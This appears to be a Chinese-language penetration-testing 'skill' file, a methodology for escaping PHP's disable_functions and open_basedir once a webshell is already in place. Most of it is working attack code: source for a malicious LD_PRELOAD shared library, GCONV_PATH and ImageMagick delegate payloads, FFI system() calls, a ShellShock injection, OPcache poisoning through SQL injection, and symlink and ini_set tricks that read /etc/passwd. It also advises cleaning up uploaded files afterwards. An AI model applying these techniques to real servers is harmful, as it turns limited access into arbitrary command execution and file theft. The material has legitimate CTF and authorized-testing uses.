# php-bypass

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 skill-web


# PHP 安全特性绕过方法论


当你已获取 webshell（能执行 PHP 代码）但无法执行系统命令时，本 skill 指导你突破 `disable_functions` 和 `open_basedir` 限制。

## 深入参考

- 方法 A-G 完整绕过代码 → [references/disable-functions-bypass.md](references/disable-functions-bypass.md)
- open_basedir 绕过方法 → [references/open-basedir-bypass.md](references/open-basedir-bypass.md)
- CTF PHP 技巧（OPcache 投毒、多态文件） → [references/ctf-php-tricks.md](references/ctf-php-tricks.md)

---

## Phase 0: 信息收集（30 秒判断）

首先确认限制范围，这决定了攻击路径：

```php
<?php
echo "disable_functions: " . ini_get('disable_functions') . "\n";
echo "open_basedir: " . ini_get('open_basedir') . "\n";
echo "PHP version: " . phpversion() . "\n";
echo "OS: " . PHP_OS . "\n";
echo "Loaded extensions: " . implode(', ', get_loaded_extensions()) . "\n";
// 关键扩展检查
echo "FFI: " . (extension_loaded('ffi') ? 'YES' : 'NO') . "\n";
echo "imagick: " . (extension_loaded('imagick') ? 'YES' : 'NO') . "\n";
echo "iconv: " . (extension_loaded('iconv') ? 'YES' : 'NO') . "\n";
echo "putenv: " . (function_exists('putenv') ? 'YES' : 'NO') . "\n";
echo "mail: " . (function_exists('mail') ? 'YES' : 'NO') . "\n";
echo "error_log: " . (function_exists('error_log') ? 'YES' : 'NO') . "\n";
?>
```

## Phase 1: disable_functions 绕过决策树

```
putenv() 可用？
├─ YES → mail()/error_log() 可用？
│   ├─ YES → 方法 A: LD_PRELOAD 劫持（最稳定，首选）
│   └─ NO → iconv 扩展加载？
│       ├─ YES → 方法 B: iconv + LD_PRELOAD
│       └─ NO → imagick 扩展？
│           ├─ YES → 方法 C: ImageMagick delegate
│           └─ NO → 下一分支
├─ NO → FFI 扩展 (PHP ≥ 7.4)？
│   ├─ YES → 方法 D: FFI 直接调用 system()
│   └─ NO → PHP < 7.4.21 / 8.0 < 8.0.8？
│       ├─ YES → 方法 E: PHP Backtrace UAF (CVE-2019-11043 等)
│       └─ NO → PCNTL 扩展？
│           ├─ YES → 方法 F: pcntl_exec()
│           └─ NO → 方法 G: ShellShock (CVE-2014-6271) / Apache mod_cgi
```

> 每种方法的完整代码见 [references/disable-functions-bypass.md](references/disable-functions-bypass.md)

---

## 实战速查表

| 看到什么 | 方法 | 命令 |
|----------|------|------|
| putenv + mail 可用 | LD_PRELOAD | 上传 .so → putenv → mail() |
| putenv + error_log 可用 | LD_PRELOAD | 同上，用 error_log() 替代 |
| putenv + iconv 可用 | GCONV_PATH | 上传 gconv-modules + .so |
| imagick 已加载 | delegate 注入 | MVG/SVG payload |
| PHP ≥ 7.4 + FFI | FFI::cdef | 直接调 system() |
| pcntl 已加载 | pcntl_exec | fork + exec |
| Bash ≤ 4.3 | ShellShock | putenv 环境变量注入 |
| 全部不行 | UAF exploit | 搜索版本对应的利用脚本 |

## 注意事项

- 优先检查 phpinfo() 确认环境，不要盲试
- LD_PRELOAD 方法需要上传 .so 文件，确保有可写目录
- FFI 方法最简洁但 PHP 版本要求高
- 某些 Docker 环境 `/usr/sbin/sendmail` 不存在 → mail() 不触发 execve → 换 error_log
- 成功执行命令后记得清理上传的 .so 文件


---

## REF: ctf-php-tricks

# CTF PHP 技巧补充
## PHP7 OPcache 投毒 Webshell

`opcache.file_cache` 启用时，编译字节码存放在 `/tmp/OPcache/[system_id]/[webroot]/script.php.bin`。通过 SQLi `INTO DUMPFILE` 替换 `.bin` 文件可绕过上传限制执行任意 PHP：

```bash
# 1. 从 phpinfo() 计算 system_id
# 2. 本地生成同版本 PHP 的 opcode 缓存
php -d opcache.file_cache=/tmp/OPcache -f payload.php
# 3. 修补 binary 中的 system_id (bytes 9-40)
# 4. 通过 SQLi INTO DUMPFILE 覆写缓存文件
```

## PNG/PHP 多态文件上传

同时是有效 PNG 和有效 PHP 的文件，绕过图片类型检测：

```bash
# PHP 代码隐藏在 PNG IDAT 块中
# 配合双扩展名(.php.png)或 .htaccess AddType 利用
```


---

## REF: disable-functions-bypass

# disable_functions 绕过方法详解
## 方法 A: LD_PRELOAD + mail()/error_log()（首选）

**原理**：`putenv()` 设置 `LD_PRELOAD` 环境变量指向恶意 .so，当 `mail()` 或 `error_log()` 内部调用 `execve()` 启动 `/usr/sbin/sendmail` 时，恶意 .so 被加载执行。

**条件**：`putenv` + (`mail` 或 `error_log`) 未被禁用，Linux 系统

### Step 1: 编译恶意 .so

```bash
cat > /tmp/bypass.c << 'EOF'
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__((constructor)) void payload() {
    const char *cmd = getenv("EVIL_CMD");
    if (cmd) {
        char buf[1024];
        snprintf(buf, sizeof(buf), "%s > /tmp/output.txt 2>&1", cmd);
        system(buf);
    }
}
EOF
gcc -shared -fPIC -o /tmp/bypass.so /tmp/bypass.c
```

### Step 2: 上传 bypass.so 到目标可写目录

常见可写目录：`/tmp/`、`/var/tmp/`、`/dev/shm/`、Web upload 目录

### Step 3: PHP 触发执行

```php
<?php
putenv("EVIL_CMD=cat /flag.txt");
putenv("LD_PRELOAD=/tmp/bypass.so");
mail("a@b.c", "", "");  // 触发 execve → 加载 .so
echo file_get_contents("/tmp/output.txt");
?>
```

**如果 mail() 被禁用**，用 `error_log("x", 1, "a@b.c");` 替代（同样触发 sendmail）。

### 简化版（无需编译 .so）

如果目标系统已有 `/usr/lib/x86_64-linux-gnu/libc.so.6`（几乎所有 Linux 都有）：

```php
<?php
// 直接利用已有的 .so，通过 LD_PRELOAD 劫持 getuid()
putenv("LD_PRELOAD=/tmp/bypass.so");
putenv("EVIL_CMD=id");
error_log("", 1, "", "");
echo file_get_contents("/tmp/output.txt");
?>
```

---

## 方法 B: iconv + LD_PRELOAD

**原理**：`iconv()` 函数在字符集转换时会加载 `/usr/lib/gconv/` 下的 .so 模块。通过 `GCONV_PATH` 环境变量指定自定义 gconv 模块目录。

**条件**：`putenv` + `iconv` 未被禁用（mail/error_log 被禁时的替代）

```php
<?php
// Step 1: 上传恶意 gconv-module 和 .so
// gconv-modules 文件内容：
// module  PAYLOAD//  INTERNAL  ../../../tmp/payload  2
// module  INTERNAL  PAYLOAD//  ../../../tmp/payload  2

putenv("GCONV_PATH=/tmp/");
iconv("PAYLOAD", "UTF-8", "x");  // 触发加载 /tmp/payload.so
echo file_get_contents("/tmp/output.txt");
?>
```

---

## 方法 C: ImageMagick delegate

**原理**：ImageMagick 处理特定格式时调用外部程序（delegate），可通过构造恶意 SVG/MVG 文件执行命令。

**条件**：`imagick` 扩展已加载

```php
<?php
// 构造 MVG payload
$payload = 'push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "ephemeral:|cat /flag.txt > /tmp/output.txt"
pop graphic-context';
file_put_contents("/tmp/payload.mvg", $payload);

$img = new Imagick("/tmp/payload.mvg");
echo file_get_contents("/tmp/output.txt");
?>
```

---

## 方法 D: FFI (PHP >= 7.4)

**原理**：PHP FFI (Foreign Function Interface) 可直接调用 C 函数，包括 `system()`。

**条件**：PHP >= 7.4 且 `ffi.enable=true`（或 `ffi.enable=preload`）

```php
<?php
$ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
$ffi->system("cat /flag.txt > /tmp/output.txt");
echo file_get_contents("/tmp/output.txt");
?>
```

**备选（popen）**：
```php
<?php
$ffi = FFI::cdef("
    void *popen(const char *command, const char *type);
    char *fgets(char *str, int n, void *stream);
    int pclose(void *stream);
", "libc.so.6");
$fp = $ffi->popen("cat /flag.txt", "r");
$buf = FFI::new("char[4096]");
while ($ffi->fgets($buf, 4096, $fp) !== null) {
    echo FFI::string($buf);
}
$ffi->pclose($fp);
?>
```

---

## 方法 E: PHP UAF (Use After Free)

**原理**：利用 PHP 引擎本身的内存漏洞绕过 disable_functions。

**适用版本**：
- PHP 7.0-7.4.x (多个 CVE)
- PHP Backtrace UAF: 7.0-7.4.x, 8.0-8.0.7

搜索利用脚本：
```bash
# 在 AboutSecurity 工具库中搜索
find /pentest/ -name "*disable*function*" -o -name "*php*uaf*" 2>/dev/null
# 或从 GitHub 获取
# https://github.com/mm0r1/exploits
```

---

## 方法 F: pcntl_exec()

**条件**：`pcntl` 扩展已加载且 `pcntl_exec` 未被禁用（CLI 模式常见）

```php
<?php
// pcntl_exec 替换当前进程（不返回）
// 需要先 fork
$pid = pcntl_fork();
if ($pid == 0) {
    // 子进程
    pcntl_exec("/bin/cat", ["/flag.txt"]);
} else {
    pcntl_wait($status);
}
?>
```

---

## 方法 G: ShellShock (CVE-2014-6271)

**条件**：Bash <= 4.3（老系统），`putenv` + `mail` 未被禁用

```php
<?php
putenv("PHP_LOL=() { :; }; cat /flag.txt > /tmp/output.txt");
mail("a@b.c", "", "");
echo file_get_contents("/tmp/output.txt");
?>
```


---

## REF: open-basedir-bypass

# open_basedir 绕过方法
## 方法 1: glob:// 协议列目录

```php
<?php
// open_basedir 不限制 glob://
$it = new DirectoryIterator("glob:///f*");  // 列出 / 下 f 开头的文件
foreach($it as $f) echo $f . "\n";

// 逐层探索
$it = new DirectoryIterator("glob:///var/www/*");
foreach($it as $f) echo $f . "\n";
?>
```

## 方法 2: ini_set 重设

```php
<?php
// 某些 PHP 版本可通过 ini_set 扩展 open_basedir
mkdir("/tmp/test");
chdir("/tmp/test");
ini_set("open_basedir", "..");
chdir("..");
chdir("..");
chdir("..");
ini_set("open_basedir", "/");
echo file_get_contents("/etc/passwd");
?>
```

## 方法 3: symlink 绕过

```php
<?php
// 创建符号链接跳出 open_basedir
symlink("/var/www/html/a/b/c/d", "/tmp/tmplink");
symlink("/tmp/tmplink/../../../../flag.txt", "/tmp/exploit");
unlink("/tmp/tmplink");
mkdir("/tmp/tmplink");
echo file_get_contents("/tmp/exploit");
?>
```
